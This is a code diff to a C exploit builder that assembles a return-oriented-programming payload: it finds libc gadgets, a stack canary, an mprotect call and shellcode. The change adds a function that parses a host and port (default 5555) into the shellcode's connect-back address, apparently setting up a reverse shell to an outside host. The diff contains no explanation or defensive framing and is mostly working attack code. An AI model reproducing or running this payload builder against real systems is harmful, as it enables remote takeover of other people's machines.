@@ -1,6 +1,7 @@
 #define _GNU_SOURCE
 #include <assert.h>
-#include <dlfcn.h>
+#include <netdb.h>	// for gethostbyname()
+#include <dlfcn.h>	// for dlsym()
 #include <stdio.h>
 #include <string.h>
 #include <unistd.h>
@@ -57,7 +58,25 @@ void initload(PayloadPtr plp) {
 	*plp = payload0;
 } // initload()
 
-void makeload(PayloadPtr plp, BaseAddressesPtr baseAddressesPtr) {
+static ssize_t argsload(PayloadPtr plp, BaseAddressesPtr baseAddressesPtr, char *p, ssize_t np) {
+        char s_host[256];
+        unsigned short nport;
+        int nc = 0, ns = sscanf(p, "%[A-Za-z0-9-.]%n:%hu%n", s_host, &nc, &nport, &nc);
+        assert(ns >= 0 && ns <= 2);
+
+        plp->pl_scu.sc.port = htons((ns > 1) ? nport : 5555);
+
+        // See if the s_host string can be parsed by inet_aton()
+        if (inet_aton(s_host, &plp->pl_scu.sc.ipAddress) == 0)
+                for (struct hostent *he = gethostbyname(s_host); he; he = NULL)
+                        for (int i = 0; ((struct in_addr **) he->h_addr_list)[i] != NULL; i++)
+                                plp->pl_scu.sc.ipAddress = *((struct in_addr **) he->h_addr_list)[i];
+
+        // Return number of characters consumed parsing the Host and IP Address.
+        return nc;
+} // argsload()
+
+ssize_t makeload(PayloadPtr plp, BaseAddressesPtr baseAddressesPtr, char *p, ssize_t np) {
 	size_t libc_size	= getpagesize() * 100; // Punt
 
 	char s_libc_popRDI[]	= {0x5f, 0xc3, 0};
@@ -112,23 +131,23 @@ l_popRDX:	 // Fallback gadget for "POP RDX"
 		__asm__ ("ret");
 	} // if
 
-	return;
+	return argsload(plp, baseAddressesPtr, p, np);
 } // makeload()
 
 void dumpload(PayloadPtr plp, BaseAddressesPtr baseAddressesPtr) {
 	fprintf(stderr, "--------------------------------------------\n");
-	fprintf(stderr, "%20s: %p\n",	"pl_canary.p",		plp->pl_canary.p);
-	fprintf(stderr, "%20s: %p\n",	"pl_rbp.p",		plp->pl_rbp.p);
-	fprintf(stderr, "%20s: %p\n",	"pl_popRDI.p",		plp->pl_popRDI.p);
-	fprintf(stderr, "%20s: %p\n",	"pl_stackPage.p",	plp->pl_stackPage.p);
-	fprintf(stderr, "%20s: %p\n",	"pl_popRSI.p",		plp->pl_popRSI.p);
-	fprintf(stderr, "%20s: %#tx\n",	"pl_stackSize",		plp->pl_stackSize);
-	fprintf(stderr, "%20s: %p\n",	"pl_popRDX.p",		plp->pl_popRDX.p);
-	fprintf(stderr, "%20s: %#tx\n",	"pl_permission",	plp->pl_permission);
-	fprintf(stderr, "%20s: %p\n",	"pl_mprotect.p",	plp->pl_mprotect.p);
-	fprintf(stderr, "%20s: %p\n",	"pl_shellCode.p",	plp->pl_shellCode.p);
-	fprintf(stderr, "%20s: %d\n",	"pl_scu.sc.port",	ntohs(plp->pl_scu.sc.port));
-	fprintf(stderr, "%20s: %s\n",	"pl_scu.sc.ipAddress",	inet_ntoa(plp->pl_scu.sc.ipAddress));
+	fprintf(stderr, "%20s: %018p\n",	"pl_canary.p",		plp->pl_canary.p);
+	fprintf(stderr, "%20s: %018p\n",	"pl_rbp.p",		plp->pl_rbp.p);
+	fprintf(stderr, "%20s: %018p\n",	"pl_popRDI.p",		plp->pl_popRDI.p);
+	fprintf(stderr, "%20s: %018p\n",	"pl_stackPage.p",	plp->pl_stackPage.p);
+	fprintf(stderr, "%20s: %018p\n",	"pl_popRSI.p",		plp->pl_popRSI.p);
+	fprintf(stderr, "%20s: %#tx\n",		"pl_stackSize",		plp->pl_stackSize);
+	fprintf(stderr, "%20s: %018p\n",	"pl_popRDX.p",		plp->pl_popRDX.p);
+	fprintf(stderr, "%20s: %#tx\n",		"pl_permission",	plp->pl_permission);
+	fprintf(stderr, "%20s: %018p\n",	"pl_mprotect.p",	plp->pl_mprotect.p);
+	fprintf(stderr, "%20s: %018p\n",	"pl_shellCode.p",	plp->pl_shellCode.p);
+	fprintf(stderr, "%20s: %d\n",		"pl_scu.sc.port",	ntohs(plp->pl_scu.sc.port));
+	fprintf(stderr, "%20s: %s\n",		"pl_scu.sc.ipAddress",	inet_ntoa(plp->pl_scu.sc.ipAddress));
 	fprintf(stderr, "--------------------------------------------\n");
 } // dumpload()
 
